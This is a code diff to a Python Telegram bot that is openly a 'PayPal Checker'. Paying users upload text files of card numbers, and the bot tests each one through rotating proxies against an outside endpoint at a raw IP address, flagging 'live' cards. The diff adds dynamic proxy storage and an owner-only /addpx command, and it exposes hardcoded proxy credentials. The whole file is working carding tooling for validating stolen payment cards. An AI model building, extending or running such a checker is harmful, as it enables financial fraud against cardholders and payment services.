@@ -1,5 +1,5 @@
 from telethon import TelegramClient, events
-import re, asyncio, os, random
+import re, asyncio, os, random, json
 import aiohttp
 import aiofiles
 from datetime import datetime
@@ -12,14 +12,22 @@ OWNER_ID = 7077294261
 
 PREMIUM_FILE = "premium.json"
 KEYS_FILE = "keys.json"
-
-PROXIES = [
-    "dc.oxylabs.io:8000:harshop01_6Mzjy:V=DMlz+qMinV_n85",
-    "px490402.pointtoserver.com:10780:purevpn0s8732217:i67s60ep"
-]
+PROXY_FILE = "proxies.json"   # New file for dynamic proxies
 
 client = TelegramClient('bot', API_ID, API_HASH)
 
+# ================== PROXIES (Dynamic) ==================
+async def load_proxies():
+    data = await load_json(PROXY_FILE)
+    return data.get("proxies", [
+        "dc.oxylabs.io:8000:harshop01_6Mzjy:V=DMlz+qMinV_n85",
+        "px490402.pointtoserver.com:10780:purevpn0s8732217:i67s60ep"
+    ])
+
+async def save_proxies(proxies_list):
+    await save_json(PROXY_FILE, {"proxies": proxies_list})
+
+# ================== UTILITIES ==================
 async def load_json(filename):
     try:
         if not os.path.exists(filename):
@@ -49,6 +57,7 @@ async def is_premium(user_id):
     except:
         return False
 
+# ================== KEY SYSTEM ==================
 async def generate_key(days: int = 30):
     import secrets
     key = "GIVEWP-" + secrets.token_hex(8).upper()
@@ -72,21 +81,23 @@ async def redeem_key(user_id, key: str):
     await save_json(PREMIUM_FILE, premium)
     return f"✅ Success! Premium activated for {days} days."
 
-# ================== YOUR API ==================
+# ================== CHECKER ==================
 async def check_card(card: str):
     current_time = datetime.now().strftime('%H:%M:%S')
     print(f"[{current_time}] CHECKING → {card}")
 
     try:
-        proxy = random.choice(PROXIES)
+        proxies = await load_proxies()
+        proxy = random.choice(proxies)
         proxy_url = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"
+        print(f"[{current_time}] PROXY → {proxy.split(':')[0]}:{proxy.split(':')[1]}")
 
         url = f"http://138.128.240.15:8024/paypal_1?cc={card}"
 
         async with aiohttp.ClientSession() as session:
             async with session.get(url, proxy=proxy_url, timeout=40) as r:
                 text = await r.text()
-                print(f"[{current_time}] STATUS: {r.status} | RESPONSE: {text[:300]}")
+                print(f"[{current_time}] STATUS: {r.status} | RESPONSE: {text[:400]}")
 
                 if r.status == 200 and any(x in text.lower() for x in ["approved", "success", "live", "charged"]):
                     print(f"[{current_time}] ✅ LIVE HIT!")
@@ -110,12 +121,27 @@ async def send_approved(event, card):
 """
     await event.reply(msg)
 
+# ================== ADD PROXY COMMAND ==================
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]addpx\s+(.+)'))
+async def add_proxy(event):
+    if event.sender_id != OWNER_ID:
+        return await event.reply("Owner only!")
+    
+    new_proxy = event.pattern_match.group(1).strip()
+    proxies = await load_proxies()
+    if new_proxy not in proxies:
+        proxies.append(new_proxy)
+        await save_proxies(proxies)
+        await event.reply(f"✅ Proxy Added Successfully!\nTotal Proxies: {len(proxies)}")
+    else:
+        await event.reply("⚠️ This proxy already exists!")
+
 # ================== BOT ==================
 @client.on(events.NewMessage(pattern=r'(?i)^[/.](start|help)$'))
 async def start(event):
     if not await is_premium(event.sender_id):
         return await event.reply("**❌ No Access**\n\nSend `/key YOURKEY`")
-    await event.reply("**🔥 PayPal Checker**\nSend `.txt` file")
+    await event.reply("**🔥 PayPal Checker**\nSend `.txt` file\nOwner: `/addpx <proxy>`")
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/.]genkey(?:\s+(\d+))?$'))
 async def genkey(event):
@@ -158,7 +184,7 @@ async def txt_handler(event):
     if not cards:
         return await event.reply("❌ No valid cards!")
 
-    await event.reply(f"✅ Found **{len(cards)}** cards. Starting...")
+    await event.reply(f"✅ Found **{len(cards)}** cards. Starting check...")
 
     for card in cards:
         result = await check_card(card)
@@ -169,7 +195,7 @@ async def txt_handler(event):
         await asyncio.sleep(5)
 
 async def main():
-    print("🚀 Bot Started")
+    print("🚀 Bot Started with /addpx Command")
     await client.start(bot_token=BOT_TOKEN)
     await client.run_until_disconnected()
 
